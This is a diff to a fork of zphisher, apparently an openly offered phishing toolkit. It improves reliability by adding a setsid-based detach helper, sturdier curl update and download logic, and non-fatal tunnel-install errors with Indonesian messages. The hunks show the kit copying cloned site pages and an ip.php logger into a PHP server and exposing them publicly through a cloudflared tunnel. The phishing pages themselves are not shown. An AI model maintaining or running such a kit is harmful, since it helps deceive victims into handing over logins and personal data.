@@ -90,7 +90,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.5"
+__version__="2.3.6"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -151,6 +151,15 @@ reset_color() {
 	return
 }
 
+## Run detached from the script/session (setsid when available, e.g. not on bare Termux)
+detach() {
+	if [[ $(command -v setsid) ]]; then
+		setsid "$@"
+	else
+		"$@"
+	fi
+}
+
 ## Kill already running process
 kill_pid() {
 	check_PID="php cloudflared loclx"
@@ -168,15 +177,18 @@ check_update(){
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/anggipradana/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
-	if [[ $new_version != $__version__ ]]; then
+	if [[ -z "$new_version" ]]; then
+		# API rate limit / offline: don't block startup
+		echo -ne "${ORANGE}unknown, skipping\n"${WHITE} ; sleep .5
+	elif [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		curl --silent --insecure --fail --retry-connrefused --retry-all-errors \
+		--connect-timeout 15 --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
+		if [[ -s ".zphisher.tar.gz" ]]; then
 			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
 			rm -f .zphisher.tar.gz
@@ -185,8 +197,10 @@ check_update(){
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
-			{ reset_color; exit 1; }
+			rm -f .zphisher.tar.gz
+			popd > /dev/null 2>&1
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Update failed, continuing with current version.\n"${WHITE}
+			sleep 2
 		fi
 	else
 		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
@@ -279,10 +293,10 @@ download() {
 	if [[ -e "$file" || -e "$output" ]]; then
 		rm -rf "$file" "$output"
 	fi
-	curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+	curl --silent --insecure --fail --retry-connrefused --retry-all-errors \
+		--connect-timeout 15 --retry 4 --retry-delay 2 --location --output "${file}" "${url}"
 
-	if [[ -e "$file" ]]; then
+	if [[ -s "$file" ]]; then
 		if [[ ${file#*.} == "zip" ]]; then
 			unzip -qq $file > /dev/null 2>&1
 			mv -f $output .server/$output > /dev/null 2>&1
@@ -406,7 +420,7 @@ setup_site() {
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && setsid php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+	cd .server/www && detach php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -460,9 +474,9 @@ start_cloudflared() {
 	# Run detached so Ctrl+C on the script doesn't take the tunnel down with it
 	# Force HTTP/2 over TCP + IPv4: QUIC/UDP drops easily behind NAT (Error 1033)
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 setsid termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 detach termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 setsid ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 detach ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
 	# Registration can take longer than a few seconds, poll instead of fixed sleep
@@ -920,6 +934,6 @@ main_menu() {
 kill_pid
 dependencies
 check_status
-install_cloudflared
-install_localxpose
+( install_cloudflared ) || echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared gagal diunduh, coba jalankan ulang tool."
+( install_localxpose ) || echo -e "\n${RED}[${WHITE}!${RED}]${RED} LocalXpose gagal diunduh (opsional), tunnel Cloudflared tetap bisa dipakai."
 main_menu
